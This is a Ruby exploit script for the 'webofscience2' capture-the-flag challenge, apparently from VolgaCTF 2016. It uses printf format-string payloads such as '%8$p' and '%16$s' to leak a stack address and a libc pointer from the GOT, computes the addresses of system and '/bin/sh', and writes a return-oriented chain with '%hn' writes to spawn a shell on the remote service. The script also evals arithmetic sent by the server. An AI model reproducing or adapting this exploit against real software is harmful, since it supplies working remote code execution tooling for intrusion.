#!/usr/bin/ruby
require '~/Tools/pwnlib'

local = false#true

if local == true
	host, port = '127.0.0.1',44444
	printf_offset = 0x50d50
	gets_offset = 0x6b0e0
	libc_start_main_offset = 0x21a50
	system_offset = 0x414f0
	sh_offset = 0x161160
else
	host, port = 'webofscience2.2016.volgactf.ru',45679
	libc_start_main_offset = 0x00021dd0
	system_offset = 0x00046640
	sh_offset = 0x0017ccdb
	exit_offset = 0x0003c290
end

def _exit(r)
	r.sendline("5")
end

def add_paper(r,name=nil,author=nil,abstract=nil,tag=nil,view=false)
	r.recv_until(">")
	r.sendline("1")
	
	add_paper_name(r,name) if name != nil
	add_paper_authors(r,author) if author != nil
	add_paper_abstract(r,abstract) if abstract != nil
	add_paper_tag(r,tag) if tag != nil
	if view != false
		leak = view(r)
	end
	quit_add(r)
	return leak[0]
end
def view(r)
	r.recv_until(">")
	r.sendline("7")
	#leak = 1
	r.recv_until("Abstract:\n	")
	leak = r.recv_capture(/(.*)\n/)
	r.recv_until("Add paper menu")
	return leak
end
def add_paper_tag(r,tag)
	r.recv_until(">")
        r.sendline("4")
        r.recv_until("Paper tags:")
        r.sendline(tag)
end
def add_paper_abstract(r,abstract)
	r.recv_until(">")
        r.sendline("3")
        r.recv_until("Paper abstract:")
        r.sendline(abstract)
end
def add_paper_authors(r,author)
	r.recv_until(">")
        r.sendline("2")
        r.recv_until("Paper authors:")
        r.sendline(author)
end
def add_paper_name(r,name)
	r.recv_until(">")
	r.sendline("1")
	r.recv_until("Paper name:")
	r.sendline(name)
end
def quit_add(r)
	r.recv_until(">")
        r.sendline("8")
end
def p64(*address)
	return address.pack("Q*")
end
PwnTube.open(host, port) do |r|
	got_printf = 0x602018
	got_gets = 0x602058
	got_libc_start_main = 0x602038
	pop3_ret = 0x00000000004016af
	pop_rdi = 0x00000000004016b3
	r.recv()
	r.sendline("%p."*20)
	puts r.recv_until("Alright, pass a little test first, would you.")
	
	10.times do |c|
		num = r.recv_capture(/(\d* \+ \d*) = \?/)
		ans = eval("#{num[0]}").to_s
		puts "#{num[0]} = #{ans}"
		r.sendline(ans)
	end
	# first add paper name is in 0x602100
	leak_rbp = add_paper(r,name="/bin/sh",author=nil,abstract="%8$p",tag=nil,view=true)
	leak_rbp = leak_rbp.to_i(16)
	puts leak_rbp
	#name=nil,author=nil,abstract=nil,tag=nil
	leak = "%16$s"
	#payload = p64(0x7a7a7a7a7a7a,0x616161616161)
	#leak = "%8352c%16$hn%16256c%17$hn"
	payload = p64(got_libc_start_main)
	leak = add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)
	libc_start_main = leak.ljust(8,"\0").unpack("Q")[0]
	base = libc_start_main - libc_start_main_offset
	system = base + system_offset
	sh = base + sh_offset
	puts "[!] base : 0x" + base.to_s(16)
	puts "[!] system : 0x" + system.to_s(16)
	puts "[!] sh : 0x" + sh.to_s(16)
	
	systemh,systemm,systeml = system.to_s(16)[0...4],system.to_s(16)[4...8],system.to_s(16)[8...12]	
	puts systemh
	puts systemm.to_i(16)
	puts systeml.to_i(16)
	
	#if systemh > systemm+systeml
		#ebp+8*5 is ret address
	
		leak = "%63040c%16$hn%295c%17$hn%34968c%18$hn"
		payload = p64(leak_rbp+8*7,leak_rbp+8*7+2,leak_rbp+8*7+4)
		puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		
		leak = "%96c%16$hn%8352c%17$hn"
		payload = p64(leak_rbp+8*6+2,leak_rbp+8*6)	
		puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		
		leak = "%64c%16$hn%5747c%17$hn"
		payload = p64(leak_rbp+8*5+2,leak_rbp+8*5)
		puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		#system
		#leak = "%38128c%16$hn%25207c%17$hn%34968c%18$hn"
		#payload = p64(leak_rbp+8*5,leak_rbp+8*5+2,leak_rbp+8*5+4)
		#puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		#exit
		#leak = "%64512c%16$hn%64358c%17$hn%34969c%18$hn"
		#payload = p64(leak_rbp+8*6,leak_rbp+8*6+2,leak_rbp+8*6+4)
		#puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		
		#leak = "%16$hn%17$hn%18$hn"
		#payload = p64(leak_rbp+8*8,leak_rbp+8*8+2,leak_rbp+8*8+4)
		#puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
		#pop3_ret
		leak = "%64c%16$hn%5743c%17$hn"
		payload = p64(leak_rbp+8*1+2,leak_rbp+8)
		puts add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
	#end
	_exit(r)
	r.interactive()
end
